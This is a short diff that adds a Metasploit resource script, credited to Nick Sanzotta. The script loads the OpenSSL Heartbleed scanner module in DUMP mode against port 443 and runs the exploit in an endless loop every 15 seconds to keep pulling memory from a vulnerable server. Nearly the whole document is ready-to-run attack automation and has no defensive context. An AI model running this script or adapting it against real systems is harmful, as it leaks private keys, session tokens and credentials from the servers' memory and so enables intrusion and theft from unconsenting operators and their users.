@@ -1,0 +1,17 @@
+<ruby
+# A Metasploit resource file to continuously dump memory from a Heartbleed Victim
+# Created by: Nick Sanzotta (@Beamr)
+require 'time'
+
+self.run_single("use auxiliary/scanner/ssl/openssl_heartbleed")
+self.run_single("set RHOSTS 0.0.0.0")
+self.run_single("set RPORT 443")
+self.run_single("set ACTION DUMP") 
+
+loop do
+ t = Time.now
+ self.run_single("exploit")
+ sleep(t + 15 - Time.now)
+end
+
+</ruby>
